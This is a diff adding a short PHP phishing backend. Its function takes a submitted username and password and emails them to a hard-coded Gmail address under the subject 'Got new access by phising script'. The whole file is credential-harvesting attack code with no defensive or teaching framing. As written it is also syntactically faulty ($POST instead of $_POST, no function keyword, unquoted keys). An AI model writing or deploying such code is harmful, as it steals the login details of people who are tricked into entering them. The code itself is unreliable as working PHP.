@@ -1,0 +1,22 @@
+<?php
+
+
+	mail_sender(){
+		$username = $POST[username];
+		$password = $POST[password];
+
+		$reciever = "sheehabxyz@gmail.com";
+
+		$subject = "Got new access by phising script";
+
+		$message = "The username is ". $username;
+		$message .= "and password is ". $password;
+
+		$sent =  mail($reciever, $subject, $message);
+
+		if($sent == true){
+			return true;
+		} else return false;
+	}
+
+?>
